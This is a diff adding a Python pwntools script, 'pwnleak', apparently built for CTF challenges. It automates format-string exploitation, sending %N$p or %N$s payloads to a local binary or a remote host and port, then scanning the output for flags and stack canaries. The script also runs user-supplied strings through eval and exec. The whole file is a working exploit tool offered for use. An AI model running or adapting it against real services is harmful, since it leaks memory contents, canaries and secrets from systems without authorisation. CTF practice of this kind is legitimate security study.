@@ -1,0 +1,238 @@
+#!/usr/bin/env python3
+# Pwn Fstring Leak
+import pwnlib.args
+pwnlib.args.free_form = False
+import argparse, re, time, os, sys
+from pwn import *
+
+class FSLeaker:
+    def __init__(self, args):
+        self.args = args
+        self.flag = ""
+        self.leaks = []
+        self.setup()
+        
+    def setup(self):
+        if self.args.verbose == 1:
+            context.log_level = 'info'
+        elif self.args.verbose == 2:
+            context.log_level = 'debug'
+        elif self.args.verbose >= 3:
+            context.log_level = 'debug'
+            self.args.verbose = True
+        else:
+            context.log_level = 'warning'
+            self.args.verbose = False 
+        context.timeout = self.args.timeout
+        if self.args.binary:
+            context.binary = self.args.binary
+            self.elf = ELF(self.args.binary)
+        else:
+            self.elf = None
+        self.flag_patterns = []
+        if self.args.pattern:
+            try:
+                re.compile(self.args.pattern)
+                self.flag_patterns.append(self.args.pattern)
+            except re.error:
+                print(f"Invalid regex pattern: {self.args.pattern}")
+        if self.args.canary:
+            canary_patterns = [
+                r'0x[0]{2}[0-9a-fA-F]{2}[0-9a-fA-F]{2}[0-9a-fA-F]{2}',
+                r'[0-9a-fA-F]{16}',
+            ]
+            self.flag_patterns.extend(canary_patterns)
+        default_patterns = [
+            r'picoCTF\{[^}]+\}',
+            r'247CTF\{[^}]+\}',
+            r'CTFlearn\{[^}]+\}',
+            r'CTF\{[^}]+\}',
+            r'[A-Za-z0-9_]+\{[A-Za-z0-9_]+\}'
+        ]
+        self.flag_patterns.extend(default_patterns)
+        if self.args.flag_format:
+            self.flagS = self.args.flag_format.encode()
+        else:
+            self.flagS = None
+    
+    def create_payload(self, i):
+        if self.args.custom_payload:
+            try:
+                payload = eval(f"f'{self.args.custom_payload}'")
+                return payload.encode() if isinstance(payload, str) else payload
+            except Exception as e:
+                debug(f"Error in custom payload: {e}")
+                pass
+        return f'%{i}${"s" if self.args.format_s else "p"}'.encode()
+    
+    def interact(self, p, payload, i):
+        if self.args.custom_logic:
+            loc = {'p': p, 'payload': payload, 'i': i, 'leak': b''}
+            try:
+                exec(self.args.custom_logic, globals(), loc)
+                return loc.get('leak', b'')
+            except Exception as e:
+                debug(f"Error in custom logic: {e}")
+                return b''
+        try:
+            if self.args.recv_string:
+                debug(f"Waiting for: {self.args.recv_string}")
+                p.recvuntil(self.args.recv_string.encode(), timeout=self.args.timeout)
+            debug(f"Sending payload: {payload}")
+            p.sendline(payload)
+            if self.args.extract_before:
+                debug(f"Waiting for extract_before: {self.args.extract_before}")
+                p.recvuntil(self.args.extract_before.encode(), timeout=self.args.timeout) 
+            if self.args.extract_until:
+                debug(f"Reading until: {self.args.extract_until}")
+                result = p.recvuntil(self.args.extract_until.encode(), drop=True, timeout=self.args.timeout)
+                debug(f"Received: {result}")
+                return result
+            else:
+                debug(f"Reading response (max 4096 bytes)")
+                result = p.recv(4096, timeout=self.args.timeout)
+                debug(f"Received: {result}")
+                return result
+        except Exception as e:
+            debug(f"Error in interaction: {e}")
+            return b''
+    
+    def check_leak(self, leak, i):
+        try:
+            if not leak:
+                debug(f"Empty response for position {i}")
+                return False
+            if isinstance(leak, bytes):
+                try:
+                    leak_str = leak.decode('utf-8', errors='replace')
+                except:
+                    leak_str = leak.decode('latin-1', errors='replace')
+            else:
+                leak_str = str(leak)
+            debug(f"Checking leak: {repr(leak_str)}")
+            if self.args.leaks:
+                self.leaks.append((i, leak_str))
+            for pattern in self.flag_patterns:
+                matches = re.findall(pattern, leak_str)
+                if matches:
+                    for match in matches:
+                        if len(match) > 8 and ('{' in match or '0x' in match):
+                            self.flag = match
+                            if context.log_level != 'warning':
+                                print(f"Flag found at position {i}")
+                            return True
+            if self.flagS:
+                flag_prefix_attempts = [
+                    self.flagS.decode('utf-8', errors='replace'),
+                    self.flagS.decode('latin-1', errors='replace')
+                ]
+                for flag_prefix in flag_prefix_attempts:
+                    if flag_prefix in leak_str:
+                        flag_pattern = f"{re.escape(flag_prefix)}\\{{[^}}]+\\}}"
+                        matches = re.findall(flag_pattern, leak_str)
+                        if matches:
+                            self.flag = matches[0]
+                            if context.log_level != 'warning':
+                                print(f"Flag found at position {i}")
+                            return True
+                        idx = leak_str.find(flag_prefix)
+                        if idx >= 0:
+                            start_brace = leak_str.find('{', idx)
+                            if start_brace >= 0:
+                                end_brace = leak_str.find('}', start_brace)
+                                if end_brace >= 0:
+                                    self.flag = leak_str[idx:end_brace+1]
+                                    if context.log_level != 'warning':
+                                        print(f"Flag found at position {i}")
+                                    return True
+                        end_idx = leak_str.find('\n', idx)
+                        if end_idx == -1:
+                            end_idx = min(idx + 100, len(leak_str))
+                        self.flag = leak_str[idx:end_idx]
+                        if context.log_level != 'warning':
+                            print(f"Potential flag data at position {i}")
+                        return True
+            if context.log_level == 'debug':
+                print(f"Position {i}: {repr(leak_str[:100])}" + ("..." if len(leak_str) > 100 else ""))
+        except Exception as e:
+            debug(f"Error processing leak at {i}: {e}")
+        return False
+    
+    def run(self):
+        if context.log_level != 'warning':
+            print(f"Searching formats {self.args.min}-{self.args.max} using %{'s' if self.args.format_s else 'p'}")
+            print(f"Target: {self.args.ip}:{self.args.port}" if self.args.ip else f"Binary: {self.args.binary}")
+        for i in range(self.args.min, self.args.max + 1):
+            for attempt in range(self.args.retries):
+                try:
+                    if self.args.ip and self.args.port:
+                        p = remote(self.args.ip, self.args.port)
+                    else:
+                        p = process(self.elf.path)
+                    payload = self.create_payload(i)
+                    leak = self.interact(p, payload, i)
+                    if self.check_leak(leak, i):
+                        p.close()
+                        if self.args.leaks:
+                            print("\nAll Leaks:")
+                            for pos, leak_data in self.leaks:
+                                print(f"Position {pos}: {repr(leak_data)}")
+                        return self.flag
+                except Exception as e:
+                    debug(f"Error in position {i}, attempt {attempt+1}: {e}")
+                finally:
+                    try:
+                        p.close()
+                    except:
+                        pass
+                    if self.args.sleep > 0:
+                        time.sleep(self.args.sleep)
+                if leak:
+                    break
+        if self.args.leaks:
+            print("\nAll Leaks:")
+            for pos, leak_data in self.leaks:
+                print(f"Position {pos}: {repr(leak_data)}")
+        if self.flag:
+            return self.flag
+        if context.log_level != 'warning':
+            print("No flag found in the specified range")
+        return None
+
+def main():
+    parser = argparse.ArgumentParser(description="pwnleak: Format String Exploitation Tool")
+    parser.add_argument('-b', dest="binary", help="Local binary to exploit")
+    parser.add_argument('-ip', dest="ip", help="Target IP/hostname")
+    parser.add_argument('-port', dest="port", type=int, help="Target port")
+    parser.add_argument('-arch', dest="arch", default="64", help="Architecture (32 or 64, default: 64)")
+    parser.add_argument('--s', action="store_true", dest="format_s", help="Use %%s format (default: %%p)")
+    parser.add_argument('-min', dest="min", type=int, default=1, help="Start position (default: 1)")
+    parser.add_argument('-max', dest="max", type=int, default=40, help="End position (default: 40)")
+    parser.add_argument('--pattern', dest="pattern", help="Custom regex pattern to find flag")
+    parser.add_argument('--canary', action="store_true", help="Look for canary leak patterns")
+    parser.add_argument('--leaks', action="store_true", help="Print all leaks found")
+    parser.add_argument('-flag', dest="flag_format", help="Flag format prefix")
+    parser.add_argument('--recv-string', dest="recv_string", help="String to receive until")
+    parser.add_argument('--extract-before', dest="extract_before", help="String before leak")
+    parser.add_argument('--extract-until', dest="extract_until", help="String to extract until")
+    parser.add_argument('--custom-logic', dest="custom_logic", help="Custom interaction code")
+    parser.add_argument('--custom-payload', dest="custom_payload", help="Custom payload template")
+    parser.add_argument('--sleep', dest="sleep", type=float, default=0, help="Sleep between attempts (seconds)")
+    parser.add_argument('--retries', dest="retries", type=int, default=1, help="Retry attempts per position")
+    parser.add_argument('--timeout', dest="timeout", type=int, default=1, help="Timeout seconds")
+    parser.add_argument('-v', action="count", dest="verbose", default=0, help="Verbose output (-v, -vv, -vvv)")
+    args = parser.parse_args()
+    if not (args.binary or (args.ip and args.port)):
+        print("Error: Need binary or ip+port target")
+        return 1
+    leaker = FSLeaker(args)
+    flag = leaker.run()
+    if flag:
+        print(f"Flag: {flag}")
+        return 0
+    else:
+        print("No flag found")
+        return 1
+
+if __name__ == "__main__":
+    sys.exit(main())
